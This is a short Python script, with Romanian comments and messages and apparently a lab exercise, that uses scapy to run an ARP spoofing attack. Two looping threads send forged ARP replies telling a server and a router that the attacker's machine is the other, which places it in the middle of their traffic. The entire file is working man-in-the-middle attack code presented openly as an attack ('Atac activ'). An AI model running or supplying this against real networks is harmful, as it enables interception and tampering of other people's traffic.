from scapy.all import *
import time
import threading

IP_SERVER = "198.7.0.2"
IP_ROUTER = "198.7.0.1"
MAC_MIDDLE = "02:42:c6:0a:00:02"

def otraveste_router():
    pachet = ARP(op=2, psrc=IP_SERVER, pdst=IP_ROUTER, hwdst="ff:ff:ff:ff:ff:ff")
    while True:
        send(pachet, verbose=0)
        time.sleep(2)

def otraveste_server():
    pachet = ARP(op=2, psrc=IP_ROUTER, pdst=IP_SERVER, hwdst="ff:ff:ff:ff:ff:ff")
    while True:
        send(pachet, verbose=0)
        time.sleep(2)

print("ARP Spoofing pornit...")
print(f"Server ({IP_SERVER}) crede ca Routerul e la MIDDLE")
print(f"Router ({IP_ROUTER}) crede ca Serverul e la MIDDLE")

t1 = threading.Thread(target=otraveste_router, daemon=True)
t2 = threading.Thread(target=otraveste_server, daemon=True)
t1.start()
t2.start()

try:
    while True:
        time.sleep(10)
        print("Atac activ...")
except KeyboardInterrupt:
    print("Atac oprit.")
